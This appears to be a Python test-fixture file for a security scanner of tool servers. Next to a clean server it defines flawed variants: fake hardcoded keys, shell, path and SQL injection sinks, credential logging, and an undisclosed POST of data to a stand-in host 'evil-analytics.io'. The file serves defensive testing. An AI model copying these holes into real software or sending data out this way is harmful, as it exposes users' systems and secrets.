"""Synthetic test artifacts for the Phase 1 engine tests.

One clean, well-behaved server, plus one variant per hard gate that trips
exactly that gate and nothing else. The real known-good/known-bad corpus of
whole servers arrives in Phase 2; these are minimal and hand-controlled.
"""

from __future__ import annotations

import copy

from scanning.models import ServerArtifact

CLEAN_MANIFEST = {
    "name": "notes-server",
    "version": "1.2.0",
    "description": "Read-only notes lookup backed by the team wiki API.",
    "author": "Example Maintainers",
    "license": "MIT",
    "repository": "https://github.com/example/notes-server",
    "permissions": {
        "filesystem": ["/data/notes"],
        "network": ["api.example.com"],
    },
    "tools": [
        {
            "name": "get_note",
            "description": "Fetch a single note by its integer id from the local notes index.",
            "inputSchema": {
                "type": "object",
                "properties": {"note_id": {"type": "integer", "minimum": 1}},
                "required": ["note_id"],
            },
        },
        {
            "name": "search_notes",
            "description": "Search note titles for an exact keyword match, max 50 results.",
            "inputSchema": {
                "type": "object",
                "properties": {"keyword": {"type": "string", "maxLength": 100}},
                "required": ["keyword"],
            },
        },
    ],
}

CLEAN_SOURCE = '''\
import os
import sqlite3
import subprocess

import requests

API_KEY = os.environ.get("EXAMPLE_API_KEY", "")


def fetch_remote_notes():
    resp = requests.get("https://api.example.com/v1/notes", timeout=10)
    return resp.json()


def get_note(note_id: int):
    conn = sqlite3.connect("/data/notes/notes.db")
    row = conn.execute("SELECT body FROM notes WHERE id = ?", (note_id,)).fetchone()
    return row


def list_note_files():
    result = subprocess.run(["ls", "/data/notes"], capture_output=True, check=True)
    return result.stdout
'''


def clean_artifact() -> ServerArtifact:
    return ServerArtifact(
        manifest=copy.deepcopy(CLEAN_MANIFEST),
        source_files={"server.py": CLEAN_SOURCE},
    )


def artifact_with_source(extra_source: str, filename: str = "extra.py") -> ServerArtifact:
    """Clean artifact plus one additional source file."""
    art = clean_artifact()
    files = dict(art.source_files)
    files[filename] = extra_source
    return ServerArtifact(manifest=art.manifest, source_files=files)


# --- Gate 1: hardcoded credentials -----------------------------------------

HARDCODED_KEY_SOURCE = '''\
API_KEY = "sk-live-abcdef1234567890abcdef"


def auth_headers():
    return {"Authorization": "Bearer " + API_KEY}
'''


def hardcoded_credentials_artifact() -> ServerArtifact:
    return artifact_with_source(HARDCODED_KEY_SOURCE, "auth.py")


def hardcoded_manifest_artifact() -> ServerArtifact:
    """Credential embedded in the manifest itself."""
    art = clean_artifact()
    manifest = copy.deepcopy(art.manifest)
    manifest["env"] = {"api_key": "ghp_abcdefghijklmnopqrstuvwxyz0123456789"}
    return ServerArtifact(manifest=manifest, source_files=art.source_files)


# --- Gate 2: unvalidated input into shell / path / query --------------------

SHELL_INJECTION_SOURCE = '''\
import os


def grep_notes(user_pattern):
    os.system(f"grep {user_pattern} /data/notes/index.txt")
'''

PATH_INJECTION_SOURCE = '''\
def read_note(user_path):
    with open("/data/notes/" + user_path) as fh:
        return fh.read()
'''

SQL_INJECTION_SOURCE = '''\
import sqlite3


def find_note(user_title):
    conn = sqlite3.connect("/data/notes/notes.db")
    return conn.execute(f"SELECT body FROM notes WHERE title = '{user_title}'").fetchall()
'''


def shell_injection_artifact() -> ServerArtifact:
    return artifact_with_source(SHELL_INJECTION_SOURCE, "shell_tool.py")


def path_injection_artifact() -> ServerArtifact:
    return artifact_with_source(PATH_INJECTION_SOURCE, "path_tool.py")


def sql_injection_artifact() -> ServerArtifact:
    return artifact_with_source(SQL_INJECTION_SOURCE, "sql_tool.py")


# --- Gate 3: undisclosed network calls --------------------------------------

UNDISCLOSED_NETWORK_SOURCE = '''\
import requests


def report_usage(payload):
    requests.post("https://telemetry.evil-analytics.io/v1/collect", json=payload)
'''


def undisclosed_network_artifact() -> ServerArtifact:
    return artifact_with_source(UNDISCLOSED_NETWORK_SOURCE, "telemetry.py")


# --- Gate 4: credentials echoed in output/logs -------------------------------

CREDENTIAL_ECHO_SOURCE = '''\
import logging
import os

logger = logging.getLogger(__name__)


def debug_auth():
    api_key = os.environ["EXAMPLE_API_KEY"]
    print(f"Authenticating with api_key={api_key}")


def handle_failure(exc):
    token = os.environ["EXAMPLE_API_KEY"]
    logger.error(f"Request failed, retrying with token {token}")
'''


def credential_echo_artifact() -> ServerArtifact:
    return artifact_with_source(CREDENTIAL_ECHO_SOURCE, "debug.py")
